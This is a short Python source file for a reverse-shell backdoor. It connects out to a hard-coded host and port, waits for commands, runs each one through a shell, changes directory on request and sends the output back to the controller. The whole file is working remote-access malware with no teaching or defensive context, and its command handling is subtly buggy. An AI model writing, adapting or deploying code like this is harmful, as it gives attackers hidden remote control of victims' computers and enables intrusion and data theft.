import socket,subprocess,os

class Backdoor:

    def __init__(self, IP, PORT):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((IP,PORT))

    def exec_cmd(self, cmd):
        res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout = res.stdout.read().decode().strip()
        stderr = res.stderr.read().decode().strip()
        if stdout:
            return (stdout+"done")
        elif stderr:
            return (stderr+"done")
    
    def r_send(self, msg):
        msg = msg.encode()
        self.connection.send(msg)

    def r_recv(self):
        return self.connection.recv(1024).decode()
    
    def change_dir(self,dirr):
        try:
            os.chdir(dirr)
            self.r_send(self.exec_cmd("pwd"))
        except Exception as e:
            self.r_send(str(e)+"done")
        

    def run(self):
        while(True):
            cmd = self.r_recv()
            cmd = cmd.split(' ')
            if cmd[0] == "cd":
                self.change_dir(cmd[1])

            elif cmd[0] == "terminate":
                self.connection.close()
                exit()
            else:
                result = self.exec_cmd(cmd)
                self.r_send(result)


backdoor = Backdoor("127.0.0.1",2000)
backdoor.run()